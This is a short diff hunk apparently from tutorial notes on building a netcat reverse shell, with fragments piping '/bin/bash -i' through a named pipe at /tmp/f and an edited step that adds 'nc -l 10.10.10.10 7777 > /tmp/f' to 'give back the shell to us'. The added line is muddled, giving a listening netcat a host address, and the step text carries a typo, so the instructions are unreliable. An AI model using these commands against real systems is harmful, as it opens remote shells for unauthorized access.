@@ -58,7 +58,7 @@ cat /tmp/f |
 ```bash
 /bin/bash -i 2>&1 |
 ```
-5. give back the shell to us through netcat
+5. give back the shell to us through netcat and loob everything back to hold session
 ```bash
-nc -l 
+nc -l 10.10.10.10 7777 > /tmp/f
 ```
